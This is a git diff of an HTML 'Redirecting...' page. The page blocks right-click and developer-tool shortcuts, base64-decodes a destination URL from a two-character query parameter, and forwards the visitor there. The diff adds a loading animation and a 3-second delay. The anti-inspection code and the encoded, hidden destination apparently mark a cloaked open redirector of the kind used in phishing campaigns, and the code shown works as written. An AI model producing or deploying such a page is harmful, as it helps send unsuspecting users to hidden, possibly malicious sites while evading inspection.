@@ -3,6 +3,21 @@
 <head>
   <meta charset="UTF-8">
   <title>Redirecting...</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      background-color: #000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    img.loader {
+      width: 150px;
+      height: auto;
+    }
+  </style>
   <script>
     // Disable right-click and common inspect shortcuts
     document.addEventListener('contextmenu', e => e.preventDefault());
@@ -16,13 +31,11 @@
       }
     };
   </script>
-
   <script>
     window.onload = function () {
       const params = new URLSearchParams(window.location.search);
       let encodedValue = '';
 
-      // Find first parameter key that is exactly 2 characters long
       for (const [key, value] of params.entries()) {
         if (key.length === 2) {
           encodedValue = value;
@@ -33,15 +46,15 @@
       if (encodedValue) {
         try {
           const decodedURL = atob(encodedValue); // Base64 decode
-
           let finalURL = decodedURL;
           if (!/^https?:\/\//i.test(finalURL)) {
             finalURL = 'http://' + finalURL;
           }
-
-          window.location.href = finalURL;
+          // Redirect after 3 seconds
+          setTimeout(() => {
+            window.location.href = finalURL;
+          }, 3000);
         } catch (e) {
-          // Redirect to about:blank if decoding fails
           window.location.href = 'about:blank';
         }
       } else {
@@ -51,6 +64,6 @@
   </script>
 </head>
 <body>
+  <img src="https://cdn.dribbble.com/userupload/20679886/file/original-88dc160ca9b545e262ac340d2425afba.gif" alt="Loading..." class="loader">
 </body>
 </html>
-
